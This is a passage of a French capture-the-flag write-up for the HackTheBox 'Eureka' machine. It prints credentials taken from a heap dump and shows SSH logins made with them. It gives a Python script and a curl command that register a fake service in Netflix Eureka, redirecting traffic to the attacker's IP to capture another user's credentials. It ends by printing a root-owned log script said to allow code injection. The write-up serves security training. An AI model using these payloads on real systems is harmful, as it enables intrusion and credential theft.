+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">select</span><span class="w"> </span><span class="n">heap</span><span class="p">.</span><span class="na">objects</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="err">&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-14.png"
+        data-srcset="/images/Eureka/Eureka-14.png, /images/Eureka/Eureka-14.png 1.5x, /images/Eureka/Eureka-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-14.png"
+        title="/images/Eureka/Eureka-14.png" width="1642" height="747" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">select</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">toString</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-15.png"
+        data-srcset="/images/Eureka/Eureka-15.png, /images/Eureka/Eureka-15.png 1.5x, /images/Eureka/Eureka-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-15.png"
+        title="/images/Eureka/Eureka-15.png" width="998" height="678" /></p>
+<p>Je trouve des identifiants MySQL <code>oscar190:0sc@r190_S0l!dP@sswd</code> avec la requête suivante.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">select</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">toString</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-16.png"
+        data-srcset="/images/Eureka/Eureka-16.png, /images/Eureka/Eureka-16.png 1.5x, /images/Eureka/Eureka-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-16.png"
+        title="/images/Eureka/Eureka-16.png" width="1200" height="669" /></p>
+<p>Pour copier facilement le contenu, il suffit ce cliquer sur l&rsquo;objet (<code>java.lang.Sting#566629</code>), cela ouvre une seconde fenêtre sur laquelle, je clique sur <code>Preview</code> pour mieux afficher le contenu. Je peux enfin copier le contenu.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-19.png"
+        data-srcset="/images/Eureka/Eureka-19.png, /images/Eureka/Eureka-19.png 1.5x, /images/Eureka/Eureka-19.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-19.png"
+        title="/images/Eureka/Eureka-19.png" width="797" height="420" /></p>
+<p>Je trouve d&rsquo;autres identifiants <code>EurekaSrvr:0scarPWDisTheB3st</code>, ceux du service <code>Eureka</code> sur le port 8761 avec la requête suivante.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">select</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">toString</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;8761&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-25.png"
+        data-srcset="/images/Eureka/Eureka-25.png, /images/Eureka/Eureka-25.png 1.5x, /images/Eureka/Eureka-25.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-25.png"
+        title="/images/Eureka/Eureka-25.png" width="704" height="457" /></p>
+<h2 id="ssh">SSH</h2>
+<p>Les identifiants MySQL sont valides et permettant d&rsquo;avoir un connexion SSH.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ssh furni.htb -u oscar190 -p <span class="s1">&#39;0sc@r190_S0l!dP@sswd&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-20.png"
+        data-srcset="/images/Eureka/Eureka-20.png, /images/Eureka/Eureka-20.png 1.5x, /images/Eureka/Eureka-20.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-20.png"
+        title="/images/Eureka/Eureka-20.png" width="1544" height="260" /></p>
+<p>Je me connecte alors par SSH en tant que <code>oscar190</code>. Ce n&rsquo;est pas cet utilisateur qui a le flag user.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh oscar190@furni.htb</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-21.png"
+        data-srcset="/images/Eureka/Eureka-21.png, /images/Eureka/Eureka-21.png 1.5x, /images/Eureka/Eureka-21.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-21.png"
+        title="/images/Eureka/Eureka-21.png" width="1090" height="525" /></p>
+<h1 id="shell-as-miranda-wise">Shell as Miranda-Wise</h1>
+<h2 id="tester-les-mots-de-passe">Tester les mots de passe</h2>
+<p>Je vois qu&rsquo;il y a un autre utilisateur : <code>miranda-wise</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-22.png"
+        data-srcset="/images/Eureka/Eureka-22.png, /images/Eureka/Eureka-22.png 1.5x, /images/Eureka/Eureka-22.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-22.png"
+        title="/images/Eureka/Eureka-22.png" width="1032" height="196" /></p>
+<p>Je teste alors sur elle, les deux mots de passe trouvés, mais aucun d&rsquo;entre eux ne fonctionne.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-26.png"
+        data-srcset="/images/Eureka/Eureka-26.png, /images/Eureka/Eureka-26.png 1.5x, /images/Eureka/Eureka-26.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-26.png"
+        title="/images/Eureka/Eureka-26.png" width="574" height="223" /></p>
+<h2 id="mysql">MySQL</h2>
+<p>En me connectant à la base de données MySQL, je trouve le hash de <code>miranda-wise</code>. Mais il ne me servira à rien puisque je n&rsquo;ai pas réussi à le cracker.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mysql -u oscar190 -p<span class="s1">&#39;0sc@r190_S0l!dP@sswd&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-23.png"
+        data-srcset="/images/Eureka/Eureka-23.png, /images/Eureka/Eureka-23.png 1.5x, /images/Eureka/Eureka-23.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-23.png"
+        title="/images/Eureka/Eureka-23.png" width="1861" height="667" /></p>
+<h2 id="eureka">Eureka</h2>
+<p>J&rsquo;essais alors de me connecter avec les identifiants <code>EurekaSrvr:0scarPWDisTheB3st</code> au service <code>Eureka</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-28.png"
+        data-srcset="/images/Eureka/Eureka-28.png, /images/Eureka/Eureka-28.png 1.5x, /images/Eureka/Eureka-28.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-28.png"
+        title="/images/Eureka/Eureka-28.png" width="1919" height="987" /></p>
+<p>Un peu en bas de la page, je vois qu&rsquo;il existe un répertoire <code>eureka</code> sur le localhost.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-29.png"
+        data-srcset="/images/Eureka/Eureka-29.png, /images/Eureka/Eureka-29.png 1.5x, /images/Eureka/Eureka-29.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-29.png"
+        title="/images/Eureka/Eureka-29.png" width="1918" height="553" /></p>
+<p>Donc je fais de la redirection de ports avec SSH.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh oscar190@furni.htb -L 8761:127.0.0.1:8761</span></span></code></pre></div></div>
+<p>Mais lorsque j&rsquo;y accède, j&rsquo;ai une erreur
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-30.png"
+        data-srcset="/images/Eureka/Eureka-30.png, /images/Eureka/Eureka-30.png 1.5x, /images/Eureka/Eureka-30.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-30.png"
+        title="/images/Eureka/Eureka-30.png" width="936" height="300" /></p>
+<p>Avec <code>dirsearch</code>, je ne trouve aucun endpoint après le répertoire <code>eureka</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/Eureka
+</span></span><span class="line"><span class="cl">❯ dirsearch -u http://127.0.0.1:8761/eureka/ -t <span class="m">50</span> -x 400,500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.3
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, jsp, html, htm <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: <span class="m">50</span> <span class="p">|</span> Wordlist size: <span class="m">12289</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://127.0.0.1:8761/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:15:39<span class="o">]</span> Scanning: eureka/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Task Completed</span></span></code></pre></div></div>
+<h2 id="ssrf">SSRF</h2>
+<p>Je demande alors à ChatGPT quelques endpoints sur <code>Eureka</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-31.png"
+        data-srcset="/images/Eureka/Eureka-31.png, /images/Eureka/Eureka-31.png 1.5x, /images/Eureka/Eureka-31.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-31.png"
+        title="/images/Eureka/Eureka-31.png" width="777" height="522" /></p>
+<p>Je me rends alors sur ces endpoints et sur le <code>/apps</code>, je peux voir la listes des applications enregistrées.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-34.png"
+        data-srcset="/images/Eureka/Eureka-34.png, /images/Eureka/Eureka-34.png 1.5x, /images/Eureka/Eureka-34.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-34.png"
+        title="/images/Eureka/Eureka-34.png" width="1008" height="990" /></p>
+<p>En recherchant su google, <code>pentest netflix eureka</code>, je trouve cet article de <a href="https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka" target="_blank" rel="noopener noreffer ">Backbase Engineering</a>. Ce qu&rsquo;il faut comprendre est que lorsque qu&rsquo;une instance <code>Eureka</code> est accessible depuis internet, il est possible d&rsquo;effectuer une <code>SSRF</code>.
+Si <code>Eureka</code> est <strong>exposé sur Internet</strong> et qu’il <strong>n’exige pas d’authentification</strong> ou qu&rsquo;un attaquant à accès aux identifiants (ce qui est notre cas ici), il peut s’y <strong>enregistrer comme un faux service</strong> en donnant comme adresse IP/Port… <strong>n’importe quelle cible</strong> que le service appelant peut joindre. Donc avec l&rsquo;aide de ChatGPT, je crée un script python permettant d&rsquo;exploiter cette vulnérabilité.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">EUREKA_URL</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">{EurekaSrvr}</span><span class="s2">:</span><span class="si">{Eureka_PASSWORD}</span><span class="s2">@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MY_IP</span> <span class="o">=</span> <span class="s2">&#34;xx.xx.xx.xx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">8081</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">json_payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;instance&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;instanceId&#34;</span><span class="p">:</span> <span class="s2">&#34;USER-MANAGEMENT-SERVICE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;hostName&#34;</span><span class="p">:</span> <span class="n">MY_IP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;app&#34;</span><span class="p">:</span> <span class="s2">&#34;USER-MANAGEMENT-SERVICE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ipAddr&#34;</span><span class="p">:</span> <span class="n">MY_IP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;UP&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;port&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;$&#34;</span><span class="p">:</span> <span class="n">TARGET_PORT</span><span class="p">,</span> <span class="s2">&#34;@enabled&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;vipAddress&#34;</span><span class="p">:</span> <span class="s2">&#34;USER-MANAGEMENT-SERVICE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;secureVipAddress&#34;</span><span class="p">:</span> <span class="s2">&#34;USER-MANAGEMENT-SERVICE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;countryId&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;dataCenterInfo&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;@class&#34;</span><span class="p">:</span> <span class="s2">&#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;MyOwn&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">EUREKA_URL</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">204</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Malicious service successfully registered.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Failure (</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">) : </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>J&rsquo;ai aussi créé une variante en une seule commande <code>curl</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl -X POST <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#34;instance&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;instanceId&#34;: &#34;USER-MANAGEMENT-SERVICE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;hostName&#34;: &#34;MY_IP&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;app&#34;: &#34;USER-MANAGEMENT-SERVICE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;ipAddr&#34;: &#34;MY_IP&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;status&#34;: &#34;UP&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;vipAddress&#34;: &#34;USER-MANAGEMENT-SERVICE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;secureVipAddress&#34;: &#34;USER-MANAGEMENT-SERVICE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;port&#34;: { &#34;$&#34;: TARGET_PORT, &#34;@enabled&#34;: &#34;true&#34; },
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;countryId&#34;: 1,
+</span></span></span><span class="line"><span class="cl"><span class="s1">      &#34;dataCenterInfo&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;@class&#34;: &#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;name&#34;: &#34;MyOwn&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">      }
+</span></span></span><span class="line"><span class="cl"><span class="s1">    }
+</span></span></span><span class="line"><span class="cl"><span class="s1">  }&#39;</span></span></span></code></pre></div></div>
+<p>Je lance alors un listener et quelques minutes plus tard, je reçois les identifiants de <code>miranda-wise</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-35.png"
+        data-srcset="/images/Eureka/Eureka-35.png, /images/Eureka/Eureka-35.png 1.5x, /images/Eureka/Eureka-35.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-35.png"
+        title="/images/Eureka/Eureka-35.png" width="1920" height="914" /></p>
+<p>Je déchiffre le mot de passe sur <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreffer ">cyberchef</a>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-36.png"
+        data-srcset="/images/Eureka/Eureka-36.png, /images/Eureka/Eureka-36.png 1.5x, /images/Eureka/Eureka-36.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-36.png"
+        title="/images/Eureka/Eureka-36.png" width="965" height="578" /></p>
+<h2 id="ssh-1">SSH</h2>
+<p>J&rsquo;obtiens un shell SSH en tant que <code>miranda-wise</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh miranda-wise@furni.htb</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-37.png"
+        data-srcset="/images/Eureka/Eureka-37.png, /images/Eureka/Eureka-37.png 1.5x, /images/Eureka/Eureka-37.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-37.png"
+        title="/images/Eureka/Eureka-37.png" width="1253" height="615" /></p>
+<h1 id="shell-en-tant-que-root">Shell en tant que root</h1>
+<h2 id="log-poisoning">Log poisoning</h2>
+<p>Dans le répertoire <code>/opt</code> se trouve un fichier <code>log_analyse.sh</code> appartenant à l&rsquo;utilisateur root.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-38.png"
+        data-srcset="/images/Eureka/Eureka-38.png, /images/Eureka/Eureka-38.png 1.5x, /images/Eureka/Eureka-38.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-38.png"
+        title="/images/Eureka/Eureka-38.png" width="896" height="227" /></p>
+<p>Dans ce fichier, se trouve plusieurs fonctions dont la fonction <code>analyze_http_statuses</code> qui est vulnérable a une injection de code malveillant.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Colors</span>
+</span></span><span class="line"><span class="cl"><span class="nv">GREEN</span><span class="o">=</span><span class="s1">&#39;\033[0;32m&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">RED</span><span class="o">=</span><span class="s1">&#39;\033[0;31m&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">YELLOW</span><span class="o">=</span><span class="s1">&#39;\033[1;33m&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">BLUE</span><span class="o">=</span><span class="s1">&#39;\033[0;34m&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">CYAN</span><span class="o">=</span><span class="s1">&#39;\033[0;36m&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">RESET</span><span class="o">=</span><span class="s1">&#39;\033[0m&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">LOG_FILE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">OUTPUT_FILE</span><span class="o">=</span><span class="s2">&#34;log_analysis.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">declare</span> -A successful_users  <span class="c1"># Associative array: username -&gt; count</span>
+</span></span><span class="line"><span class="cl"><span class="nb">declare</span> -A failed_users      <span class="c1"># Associative array: username -&gt; count</span>
+</span></span><span class="line"><span class="cl"><span class="nv">STATUS_CODES</span><span class="o">=(</span><span class="s2">&#34;200:0&#34;</span> <span class="s2">&#34;201:0&#34;</span> <span class="s2">&#34;302:0&#34;</span> <span class="s2">&#34;400:0&#34;</span> <span class="s2">&#34;401:0&#34;</span> <span class="s2">&#34;403:0&#34;</span> <span class="s2">&#34;404:0&#34;</span> <span class="s2">&#34;500:0&#34;</span><span class="o">)</span> <span class="c1"># Indexed array: &#34;code:count&#34; pairs</span>
+</span></span><span class="line"><span class="cl">
